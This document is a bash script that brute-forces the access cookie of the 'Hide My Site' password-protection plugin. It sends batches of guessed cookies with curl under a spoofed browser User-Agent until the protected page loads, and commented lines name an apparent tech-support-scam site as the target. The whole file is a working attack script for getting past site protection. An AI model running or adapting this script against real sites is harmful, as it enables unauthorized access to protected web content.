#!/bin/bash

# bruteforce the 'hite-my-site' protection cookie

#RESPONSE=$(curl -s http://%%%%%%%%%.com/);


COOKIE="hide_my_site-access1=1"

STEPS=256;


for i in {1..300}; do

    A=$(( $i * $STEPS ));
    B=$(( $A + $STEPS ));

    COOKIE="a=b";


    for z in $( seq $A $B ); do

        COOKIE="${COOKIE};hide_my_site-access${z}=1"

    done;

    #echo $COOKIE;
    RESPONSE=`curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36" --cookie "${COOKIE}" http://%%%%%%%%%%%%%%.com/`

    
    if [ ${RESPONSE:34:7} = "Windows" ]; then
        echo $i
    else
        echo $i;
        echo 'FOUND'
        echo $COOKIE;
        echo $RESPONSE;
        exit;
    fi


done;

echo 'SADFACE';

exit;



#echo $COOKIE;
#RESPONSE=`curl -s -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.78 Safari/537.36" --cookie "${COOKIE}" http://support29.com/`

#echo $RESPONSE;
#exit;
#echo ${RESPONSE:34:7};
#exit;





#echo ${RESPONSE:34:7}

#<!DOCTYPE html><html><head><title>Windows Security Passcode
